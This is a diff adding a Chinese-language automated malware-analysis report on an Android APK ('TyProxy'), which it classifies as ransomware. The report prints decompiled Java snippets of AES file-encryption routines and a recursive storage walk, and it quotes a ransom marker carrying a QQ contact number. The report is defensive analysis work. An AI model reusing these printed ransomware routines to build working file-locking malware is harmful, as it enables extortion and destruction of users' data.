@@ -1,0 +1,94 @@
+{
+  "APK信息": {
+    "文件名": "16c497c382492c0132d581a4ece0ef0ab6c8ba7b265a9d7b0f6d47d9871d5e06.apk",
+    "sha256": "16c497c382492c0132d581a4ece0ef0ab6c8ba7b265a9d7b0f6d47d9871d5e06",
+    "包名": "com.android.admin.hongyan",
+    "应用名": "TyProxy",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 187.2
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "LXbox\\AESUtils;",
+          "method_signature": "encrypt(byte[] bArr, String str)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static byte[] encrypt(byte[] bArr, String str) throws Exception {\n    SecretKeySpec secretKeySpec = new SecretKeySpec(toKey(Base64Utils.decode(str)).getEncoded(), ALGORITHM);\n    Cipher cipher = Cipher.getInstance(ALGORITHM);\n    cipher.init(1, secretKeySpec);\n    return cipher.doFinal(bArr);\n}\n\npublic static void encryptFile(String str, String str2, String str3) throws Exception {\n    File file = new File(str2);\n    File file2 = new File(str3);\n    if (!file.exists() || !file.isFile()) {\n        return;\n    }\n    if (!file2.getParentFile().exists()) {\n        file2.getParentFile().mkdirs();\n    }",
+          "malicious_code_snippet_context": "          return Base64Utils.encode(keyGenerator.generateKey().getEncoded());\n      }\n  \n>>>     public static byte[] encrypt(byte[] bArr, String str) throws Exception {\n>>>         SecretKeySpec secretKeySpec = new SecretKeySpec(toKey(Base64Utils.decode(str)).getEncoded(), ALGORITHM);\n>>>         Cipher cipher = Cipher.getInstance(ALGORITHM);\n>>>         cipher.init(1, secretKeySpec);\n>>>         return cipher.doFinal(bArr);\n>>>     }\n>>> \n>>>     public static void encryptFile(String str, String str2, String str3) throws Exception {\n>>>         File file = new File(str2);\n>>>         File file2 = new File(str3);\n>>>         if (!file.exists() || !file.isFile()) {\n>>>             return;\n>>>         }\n>>>         if (!file2.getParentFile().exists()) {\n>>>             file2.getParentFile().mkdirs();\n>>>         }\n          file2.createNewFile();\n          FileInputStream fileInputStream = new FileInputStream(file);\n          FileOutputStream fileOutputStream = new FileOutputStream(file2);",
+          "behavior_description": "该代码是勒索软件的文件加密模块。encryptFile方法接收源文件路径和目标输出路径，对用户文件进行AES加密；encrypt方法使用Base64解码后的密钥构造SecretKeySpec，初始化Cipher为加密模式(1=ENCRYPT_MODE)，调用cipher.doFinal()对文件字节数据执行AES加密。数据流向：用户文件数据(file)→AES加密(cipher.doFinal)，加密后文件被写入新路径，原始文件可能被覆盖或删除，导致用户数据无法访问，构成勒索软件的核心加密行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\admin\\hongyan\\lock;",
+          "method_signature": "b(File file)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void b(File file) {\n    File[] listFiles = file.listFiles();\n    if (listFiles != null) {\n        for (File file2 : listFiles) {\n            if (file2.isDirectory()) {\n                b(file2);\n            } else {\n                FileEncryptUtils.decryptFile(this.key, file2.toString(), file2.toString().split(\".文件已加密联系QQ1556340693\")[0].toString());\n            }\n        }\n    }\n}",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public void b(File file) {\n>>>         File[] listFiles = file.listFiles();\n>>>         if (listFiles != null) {\n>>>             for (File file2 : listFiles) {\n>>>                 if (file2.isDirectory()) {\n>>>                     b(file2);\n>>>                 } else {\n>>>                     FileEncryptUtils.decryptFile(this.key, file2.toString(), file2.toString().split(\".文件已加密联系QQ1556340693\")[0].toString());\n>>>                 }\n>>>             }\n>>>         }\n>>>     }\n  }",
+          "behavior_description": "该代码是一个勒索软件的文件操作行为。从外部存储目录(Environment.getExternalStorageDirectory())开始，递归遍历所有子目录和文件，对每个文件调用FileEncryptUtils.decryptFile进行解密操作。文件名中包含'.文件已加密联系QQ1556340693'的勒索标记，表明该恶意软件此前已对用户文件进行了加密勒索，此段代码为解密恢复逻辑。数据流向：getExternalStorageDirectory()获取存储路径→listFiles()递归遍历→decryptFile()对文件进行加密/解密操作，属于典型的勒索软件文件破坏行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
